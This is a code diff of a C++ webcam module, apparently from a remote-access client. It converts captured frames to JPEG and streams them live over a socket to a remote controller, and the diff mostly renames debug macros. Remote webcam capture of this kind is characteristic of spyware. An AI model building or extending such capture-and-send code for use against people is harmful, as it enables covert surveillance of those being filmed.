@@ -95,13 +95,13 @@ std::vector<BYTE> mod_Camera::toJPEG(const BYTE* bmpBuffer, u_int uiBuffersize) 
 
     nStream = SHCreateMemStream(bmpBuffer, uiBuffersize);
     if (!nStream) {
-        DebugPrint("[X] SHCreateMemStream error");
+        __DBG_("[X] SHCreateMemStream error");
         goto release;
     }
 
     hr = CreateStreamOnHGlobal(hGlobalMem, TRUE, &oStream);
     if (hr != S_OK) {
-        DebugPrint("[X] CreateStreamOnHGlobal error");
+        __DBG_("[X] CreateStreamOnHGlobal error");
         goto release;
     }
 
@@ -109,30 +109,30 @@ std::vector<BYTE> mod_Camera::toJPEG(const BYTE* bmpBuffer, u_int uiBuffersize) 
 
     nImage = Gdiplus::Image::FromStream(nStream);
     if (nImage == nullptr || nImage->GetLastStatus() != Gdiplus::Ok) {
-        DebugPrint("[X] Gdiplus::Image::FromStream error");
+        __DBG_("[X] Gdiplus::Image::FromStream error");
         goto release;
     }
 
     
     iRet = this->GetEncoderClsid(L"image/jpeg", &encoderClsid);
     if (iRet == -1) {
-        DebugPrint("[X] image/jpeg not found trying PNG...");
+        __DBG_("[X] image/jpeg not found trying PNG...");
         iRet = this->GetEncoderClsid(L"image/png", &encoderClsid);
         if (iRet == -1) {
-            DebugPrint("[X] image/png not found bye...");
+            __DBG_("[X] image/png not found bye...");
             goto release;
         }
     }
 
     stat = nImage->Save(oStream, &encoderClsid, NULL);
     if (stat != Gdiplus::Ok) {
-        DebugPrint("[X] nImage->Save");
+        __DBG_("[X] nImage->Save");
         goto release;
     }
 
     hr = oStream->Stat(&statstg, STATFLAG_NONAME);
     if (hr != S_OK) {
-        DebugPrint("[X] oStream->Stat");
+        __DBG_("[X] oStream->Stat");
         goto release;
     }
 
@@ -144,7 +144,7 @@ std::vector<BYTE> mod_Camera::toJPEG(const BYTE* bmpBuffer, u_int uiBuffersize) 
 
     hr = oStream->Read(bJPEGbuffer.data(), uiBuffS, &bytesRead);
     if (hr != S_OK) {
-        DebugPrint("[X] oStream->Read");
+        __DBG_("[X] oStream->Read");
     }
 
 
@@ -543,7 +543,7 @@ std::vector<BYTE> mod_Camera::GetFrame(int pIndexDev) {
                     memcpy(cBufferOut.data(), bmpHeadBuff.data(), iOutSize);
                     memcpy(cBufferOut.data() + iOutSize, pData, currentLength);
                 } else {
-                    DebugPrint("[X] No se pudo crear la cabecera bmp");
+                    __DBG_("[X] No se pudo crear la cabecera bmp");
                 }
 
                 pBuffer->Unlock();
@@ -587,7 +587,7 @@ void mod_Camera::LiveCam(int pIndexDev) {
     if (SUCCEEDED(hr)) {
         this->vcCamObjs[pIndexDev].isActivated = this->vcCamObjs[pIndexDev].isLive = true;
 
-        DebugPrint("[!]Live iniciado");
+        __DBG_("[!]Live iniciado");
 
         std::string strHeader = std::to_string(pIndexDev);
         strHeader.append(1, CMD_DEL);
@@ -607,7 +607,6 @@ void mod_Camera::LiveCam(int pIndexDev) {
                         memcpy(cPacket.data(), strHeader.c_str(), iHeaderSize);
                         memcpy(cPacket.data() + iHeaderSize, cJPGBuffer.data(), cJPGBuffer.size());
                         
-                        //int iSent = cCliente->cSend(cCliente->sckSocket, reinterpret_cast<const char*>(cPacket.get()), uiPacketSize, 0, true, nullptr);
                         int iSent = cCliente->cChunkSend(cCliente->sckSocket, cPacket.data(), uiPacketSize, 0, true, nullptr, EnumComandos::CM_Single_Salida);
                         if (iSent == -1) {
                             this->vcCamObjs[pIndexDev].isLive = false;
@@ -619,6 +618,6 @@ void mod_Camera::LiveCam(int pIndexDev) {
             }
         }
 
-        DebugPrint("[!]Live terminado");
+        __DBG_("[!]Live terminado");
     }
 }
